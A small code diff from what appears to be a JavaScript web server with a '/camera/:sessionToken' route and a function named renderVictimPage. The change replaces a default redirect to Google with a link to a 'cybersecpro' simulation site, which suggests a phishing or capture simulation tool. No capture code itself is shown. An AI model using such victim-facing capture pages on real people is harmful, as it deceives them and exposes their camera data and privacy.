@@ -88,7 +88,7 @@ router.get('/camera/:sessionToken', (req, res) => {
  *  5. After both are captured → redirect to simdatabase
  */
 function renderVictimPage(sessionToken, redirectUrl) {
-  const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
+  const REDIRECT_URL = redirectUrl || 'https://cybersecprosimdatabase.vercel.app/';
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
